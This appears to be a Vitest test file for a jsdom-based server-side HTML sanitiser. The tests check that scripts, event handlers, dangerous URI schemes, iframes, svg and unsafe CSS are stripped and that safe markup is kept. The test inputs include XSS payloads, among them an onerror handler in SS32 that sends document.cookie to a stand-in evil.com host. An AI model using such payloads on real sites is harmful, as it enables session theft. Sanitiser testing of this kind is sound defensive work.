/**
 * sanitiseHtmlServer — server-side HTML sanitiser tests (CP9B)
 * ─────────────────────────────────────────────────────────────
 * Parser: jsdom (HTML5 DOM-walk, no regex tokeniser)
 *
 * SS1  Script tag and content are removed
 * SS2  Inline event handlers are stripped
 * SS3  javascript: href is stripped
 * SS4  vbscript: href is stripped
 * SS5  data: URI in img src is blocked
 * SS6  http:// img src is blocked (tracking pixel)
 * SS7  https:// img src is blocked (external tracking pixel)
 * SS8  blob: img src is blocked (server-side meaningless)
 * SS9  Same-origin /api/ img src is preserved
 * SS10 Same-origin relative /images/... img src is preserved
 * SS11 iframe is removed with content
 * SS12 object/embed are removed with content
 * SS13 svg is removed with content
 * SS14 math is removed with content
 * SS15 form element is removed (tag stripped, children preserved)
 * SS16 style element and content are removed
 * SS17 noscript element and content are removed
 * SS18 Unsafe CSS (expression, url(), javascript:) is stripped
 * SS19 Safe CSS (font-size, color, border, padding) is preserved
 * SS20 Headings h1–h6 are preserved
 * SS21 Tables with colspan/rowspan are preserved
 * SS22 Lists (ul/ol/li) are preserved
 * SS23 Inline formatting (b/i/u/em/strong/s/del) is preserved
 * SS24 Page-break div is preserved
 * SS25 Anchor with safe href is preserved; rel=noopener noreferrer added
 * SS26 Anchor with javascript: href is stripped
 * SS27 Anchor with http: href is preserved (links are not tracking pixels)
 * SS28 DOM-clobbering id/name attributes are stripped
 * SS29 srcdoc/formaction/action/ping attributes are stripped
 * SS30 Empty string returns empty string
 * SS31 Nested script inside div — script content not leaked as text
 * SS32 onerror on img is stripped; safe src preserved
 * SS33 onload on div is stripped
 * SS34 data:text/html in href is stripped
 * SS35 Script content not leaked when script is nested inside allowed tag
 * SS36 Malformed/unclosed tags handled gracefully (jsdom auto-closes)
 * SS37 Mixed-case event handler (onClick) stripped
 * SS38 External https img src blocked even with /api/ in path query string
 */

import { describe, it, expect } from 'vitest';
import { sanitiseHtmlServer } from '../sanitiseHtmlServer';

// ── SS1 — Script tag and content removed ─────────────────────────────────────
describe('SS1 — script tag and content removed', () => {
  it('removes <script> and its text content', () => {
    const out = sanitiseHtmlServer('<p>Hello</p><script>alert(1)</script><p>World</p>');
    expect(out).not.toContain('script');
    expect(out).not.toContain('alert');
    expect(out).toContain('Hello');
    expect(out).toContain('World');
  });

  it('removes <script> with src attribute', () => {
    const out = sanitiseHtmlServer('<script src="https://evil.com/x.js"></script>');
    expect(out).not.toContain('script');
    expect(out).not.toContain('evil.com');
  });

  it('removes <script> with type=module', () => {
    const out = sanitiseHtmlServer('<script type="module">import x from "https://evil.com"</script>');
    expect(out).not.toContain('script');
    expect(out).not.toContain('evil.com');
  });
});

// ── SS2 — Event handlers stripped ────────────────────────────────────────────
describe('SS2 — inline event handlers stripped', () => {
  it('strips onerror from img', () => {
    const out = sanitiseHtmlServer('<img src="/api/img/1" onerror="alert(1)">');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('alert');
  });

  it('strips onclick from div', () => {
    const out = sanitiseHtmlServer('<div onclick="evil()">text</div>');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('evil');
    expect(out).toContain('text');
  });

  it('strips onload from element', () => {
    const out = sanitiseHtmlServer('<div onload="steal()">content</div>');
    expect(out).not.toContain('onload');
    expect(out).toContain('content');
  });

  it('strips onmouseover', () => {
    const out = sanitiseHtmlServer('<span onmouseover="x()">hover</span>');
    expect(out).not.toContain('onmouseover');
    expect(out).toContain('hover');
  });
});

// ── SS3 — javascript: href stripped ──────────────────────────────────────────
describe('SS3 — javascript: href stripped', () => {
  it('removes href with javascript: scheme', () => {
    const out = sanitiseHtmlServer('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toContain('javascript:');
    expect(out).toContain('click');
  });

  it('removes href with JavaScript: (mixed case)', () => {
    const out = sanitiseHtmlServer('<a href="JavaScript:void(0)">x</a>');
    expect(out).not.toContain('JavaScript:');
  });
});

// ── SS4 — vbscript: href stripped ────────────────────────────────────────────
describe('SS4 — vbscript: href stripped', () => {
  it('removes href with vbscript: scheme', () => {
    const out = sanitiseHtmlServer('<a href="vbscript:MsgBox(1)">x</a>');
    expect(out).not.toContain('vbscript:');
  });
});

// ── SS5–SS8 — img src URL policy ─────────────────────────────────────────────
describe('SS5–SS8 — img src URL policy', () => {
  it('SS5 — blocks data: URI in img src', () => {
    const out = sanitiseHtmlServer('<img src="data:image/png;base64,abc" alt="x">');
    expect(out).not.toContain('data:');
  });

  it('SS6 — blocks http:// img src (tracking pixel)', () => {
    const out = sanitiseHtmlServer('<img src="http://tracker.example.com/pixel.gif" alt="">');
    expect(out).not.toContain('http://tracker');
    expect(out).not.toContain('tracker.example.com');
  });

  it('SS7 — blocks https:// img src (external tracking pixel)', () => {
    const out = sanitiseHtmlServer('<img src="https://evil.com/track.png" alt="">');
    expect(out).not.toContain('https://evil.com');
  });

  it('SS8 — blocks blob: img src (server-side meaningless)', () => {
    const out = sanitiseHtmlServer('<img src="blob:https://iwillbuild.com/abc-123" alt="">');
    expect(out).not.toContain('blob:');
  });
});

// ── SS9–SS10 — safe img src preserved ────────────────────────────────────────
describe('SS9–SS10 — safe img src preserved', () => {
  it('SS9 — preserves /api/ img src', () => {
    const out = sanitiseHtmlServer('<img src="/api/document-templates/5/image/3" alt="diagram">');
    expect(out).toContain('/api/document-templates/5/image/3');
    expect(out).toContain('alt="diagram"');
  });

  it('SS10 — preserves same-origin relative img src', () => {
    const out = sanitiseHtmlServer('<img src="/images/logo.png" alt="logo">');
    expect(out).toContain('/images/logo.png');
  });
});

// ── SS11–SS14 — dangerous elements removed with content ──────────────────────
describe('SS11–SS14 — dangerous elements removed with content', () => {
  it('SS11 — removes iframe and its content', () => {
    const out = sanitiseHtmlServer('<p>before</p><iframe src="https://evil.com"></iframe><p>after</p>');
    expect(out).not.toContain('iframe');
    expect(out).not.toContain('evil.com');
    expect(out).toContain('before');
    expect(out).toContain('after');
  });

  it('SS12 — removes object and embed with content', () => {
    const out = sanitiseHtmlServer('<object data="x.swf"><param name="movie" value="x.swf"></object><embed src="y.swf">');
    expect(out).not.toContain('object');
    expect(out).not.toContain('embed');
    expect(out).not.toContain('x.swf');
  });

  it('SS13 — removes svg and its content', () => {
    const out = sanitiseHtmlServer('<svg onload="alert(1)"><script>evil()</script></svg>');
    expect(out).not.toContain('svg');
    expect(out).not.toContain('onload');
    expect(out).not.toContain('evil');
  });

  it('SS14 — removes math and its content', () => {
    const out = sanitiseHtmlServer('<math><mrow><script>x()</script></mrow></math>');
    expect(out).not.toContain('math');
    expect(out).not.toContain('script');
  });
});

// ── SS15 — form element stripped, children preserved ─────────────────────────
describe('SS15 — form element stripped, children preserved', () => {
  it('removes form tag but keeps child text', () => {
    const out = sanitiseHtmlServer('<form action="/steal"><p>content</p></form>');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('action=');
    expect(out).toContain('content');
  });
});

// ── SS16–SS17 — style/noscript removed with content ──────────────────────────
describe('SS16–SS17 — style and noscript removed with content', () => {
  it('SS16 — removes style element and its content', () => {
    const out = sanitiseHtmlServer('<style>body{background:url(https://evil.com/x)}</style><p>text</p>');
    expect(out).not.toContain('style');
    expect(out).not.toContain('evil.com');
    expect(out).toContain('text');
  });

  it('SS17 — removes noscript and its content', () => {
    const out = sanitiseHtmlServer('<noscript><img src="https://tracker.com/pixel"></noscript><p>ok</p>');
    expect(out).not.toContain('noscript');
    expect(out).not.toContain('tracker.com');
    expect(out).toContain('ok');
  });
});

// ── SS18–SS19 — CSS sanitisation ─────────────────────────────────────────────
describe('SS18–SS19 — CSS sanitisation', () => {
  it('SS18 — strips unsafe CSS: expression(), url(), javascript:', () => {
    const out = sanitiseHtmlServer(
      '<p style="color:red;background:url(https://evil.com/x);width:expression(alert(1))">text</p>',
    );
    expect(out).not.toContain('url(');
    expect(out).not.toContain('expression(');
    expect(out).not.toContain('evil.com');
    expect(out).toContain('color');
    expect(out).toContain('text');
  });

  it('SS19 — preserves safe CSS properties', () => {
    const out = sanitiseHtmlServer(
      '<p style="font-size:14px;color:#333;border:1px solid #ccc;padding:4px">text</p>',
    );
    expect(out).toContain('font-size');
    expect(out).toContain('color');
    expect(out).toContain('border');
    expect(out).toContain('padding');
    expect(out).toContain('text');
  });
});

// ── SS20 — Headings preserved ─────────────────────────────────────────────────
describe('SS20 — headings preserved', () => {
  it('preserves h1–h6', () => {
    const input = '<h1>One</h1><h2>Two</h2><h3>Three</h3><h4>Four</h4><h5>Five</h5><h6>Six</h6>';
    const out = sanitiseHtmlServer(input);
    for (let i = 1; i <= 6; i++) {
      expect(out).toContain(`<h${i}>`);
      expect(out).toContain(`</h${i}>`);
    }
  });
});

// ── SS21 — Tables with colspan/rowspan preserved ──────────────────────────────
describe('SS21 — tables with colspan/rowspan preserved', () => {
  it('preserves table structure and cell attributes', () => {
    const input = `
      <table>
        <thead><tr><th colspan="2">Header</th></tr></thead>
        <tbody>
          <tr><td rowspan="2">A</td><td>B</td></tr>
          <tr><td>C</td></tr>
        </tbody>
      </table>`;
    const out = sanitiseHtmlServer(input);
    expect(out).toContain('<table>');
    expect(out).toContain('<thead>');
    expect(out).toContain('<tbody>');
    expect(out).toContain('colspan="2"');
    expect(out).toContain('rowspan="2"');
    expect(out).toContain('Header');
  });
});

// ── SS22 — Lists preserved ────────────────────────────────────────────────────
describe('SS22 — lists preserved', () => {
  it('preserves ul/ol/li', () => {
    const out = sanitiseHtmlServer('<ul><li>Item 1</li><li>Item 2</li></ul><ol><li>A</li></ol>');
    expect(out).toContain('<ul>');
    expect(out).toContain('<ol>');
    expect(out).toContain('<li>');
    expect(out).toContain('Item 1');
  });
});

// ── SS23 — Inline formatting preserved ───────────────────────────────────────
describe('SS23 — inline formatting preserved', () => {
  it('preserves b/i/u/em/strong/s/del', () => {
    const input = '<b>bold</b><i>italic</i><u>under</u><em>em</em><strong>str</strong><s>strike</s><del>del</del>';
    const out = sanitiseHtmlServer(input);
    expect(out).toContain('bold');
    expect(out).toContain('italic');
    expect(out).toContain('under');
    expect(out).toContain('em');
    expect(out).toContain('str');
    expect(out).toContain('strike');
    expect(out).toContain('del');
  });
});

// ── SS24 — Page-break div preserved ──────────────────────────────────────────
describe('SS24 — page-break div preserved', () => {
  it('preserves div with class page-break and page-break CSS', () => {
    const out = sanitiseHtmlServer(
      '<div class="page-break" style="page-break-after:always"></div>',
    );
    expect(out).toContain('page-break');
    expect(out).toContain('page-break-after');
  });
});

// ── SS25–SS27 — Anchor href policy ───────────────────────────────────────────
describe('SS25–SS27 — anchor href policy', () => {
  it('SS25 — preserves https href and adds rel=noopener noreferrer', () => {
    const out = sanitiseHtmlServer('<a href="https://example.com" title="link">text</a>');
    expect(out).toContain('https://example.com');
    expect(out).toContain('noopener noreferrer');
    expect(out).toContain('text');
  });

  it('SS26 — strips javascript: href', () => {
    const out = sanitiseHtmlServer('<a href="javascript:void(0)">x</a>');
    expect(out).not.toContain('javascript:');
    expect(out).toContain('x');
  });

  it('SS27 — preserves http: href (links are not tracking pixels)', () => {
    const out = sanitiseHtmlServer('<a href="http://example.com">link</a>');
    expect(out).toContain('http://example.com');
  });
});

// ── SS28 — DOM-clobbering attributes stripped ─────────────────────────────────
describe('SS28 — DOM-clobbering attributes stripped', () => {
  it('strips id and name from elements', () => {
    const out = sanitiseHtmlServer('<div id="location" name="location">text</div>');
    expect(out).not.toContain(' id=');
    expect(out).not.toContain(' name=');
    expect(out).toContain('text');
  });
});

// ── SS29 — Dangerous attributes stripped ─────────────────────────────────────
describe('SS29 — dangerous attributes stripped', () => {
  it('strips srcdoc, formaction, action, ping', () => {
    const out = sanitiseHtmlServer(
      '<div srcdoc="<script>x()</script>" formaction="/steal" ping="https://evil.com">text</div>',
    );
    expect(out).not.toContain('srcdoc');
    expect(out).not.toContain('formaction');
    expect(out).not.toContain('ping=');
    expect(out).toContain('text');
  });
});

// ── SS30 — Empty string ───────────────────────────────────────────────────────
describe('SS30 — empty string', () => {
  it('returns empty string for empty input', () => {
    expect(sanitiseHtmlServer('')).toBe('');
  });
});

// ── SS31 — Nested script content not leaked ───────────────────────────────────
describe('SS31 — nested script content not leaked as text', () => {
  it('removes script nested inside div — no text leakage', () => {
    const out = sanitiseHtmlServer('<div><script>stealCookies()</script>visible</div>');
    expect(out).not.toContain('stealCookies');
    expect(out).toContain('visible');
  });
});

// ── SS32 — onerror on img stripped, safe src preserved ───────────────────────
describe('SS32 — onerror on img stripped', () => {
  it('strips onerror but keeps safe src and alt', () => {
    const out = sanitiseHtmlServer(
      '<img src="/api/document-templates/1/image/2" alt="chart" onerror="fetch(\'https://evil.com/?\'+document.cookie)">',
    );
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('evil.com');
    expect(out).toContain('/api/document-templates/1/image/2');
    expect(out).toContain('alt="chart"');
  });
});

// ── SS33 — onload on div stripped ────────────────────────────────────────────
describe('SS33 — onload on div stripped', () => {
  it('strips onload attribute', () => {
    const out = sanitiseHtmlServer('<div onload="exfil()">content</div>');
    expect(out).not.toContain('onload');
    expect(out).toContain('content');
  });
});

// ── SS34 — data:text/html in href stripped ────────────────────────────────────
describe('SS34 — data:text/html in href stripped', () => {
  it('strips data:text/html href', () => {
    const out = sanitiseHtmlServer('<a href="data:text/html,<script>alert(1)</script>">x</a>');
    expect(out).not.toContain('data:text/html');
    expect(out).toContain('x');
  });
});

// ── SS35 — Script content not leaked when nested inside allowed tag ───────────
describe('SS35 — script content not leaked when nested inside allowed tag', () => {
  it('p > script: script content removed, p text preserved', () => {
    const out = sanitiseHtmlServer('<p>Safe text<script>document.cookie</script> more text</p>');
    expect(out).not.toContain('document.cookie');
    expect(out).toContain('Safe text');
    expect(out).toContain('more text');
  });
});

// ── SS36 — Malformed HTML handled gracefully ──────────────────────────────────
describe('SS36 — malformed HTML handled gracefully', () => {
  it('handles unclosed tags without throwing', () => {
    expect(() => sanitiseHtmlServer('<p>text<b>bold')).not.toThrow();
    const out = sanitiseHtmlServer('<p>text<b>bold');
    expect(out).toContain('text');
    expect(out).toContain('bold');
  });

  it('handles deeply nested unclosed tags', () => {
    expect(() => sanitiseHtmlServer('<div><p><span><b>deep')).not.toThrow();
  });
});

// ── SS37 — Mixed-case event handler stripped ──────────────────────────────────
describe('SS37 — mixed-case event handler stripped', () => {
  it('strips onClick (React-style casing)', () => {
    // jsdom lowercases attribute names during parsing
    const out = sanitiseHtmlServer('<div onClick="evil()">text</div>');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('onClick');
    expect(out).toContain('text');
  });
});

// ── SS38 — External https img src blocked even with /api/ in query string ─────
describe('SS38 — external https img src blocked even with /api/ in query string', () => {
  it('blocks https:// src that contains /api/ in the path', () => {
    const out = sanitiseHtmlServer('<img src="https://evil.com/api/steal?x=1" alt="">');
    expect(out).not.toContain('https://evil.com');
  });
});
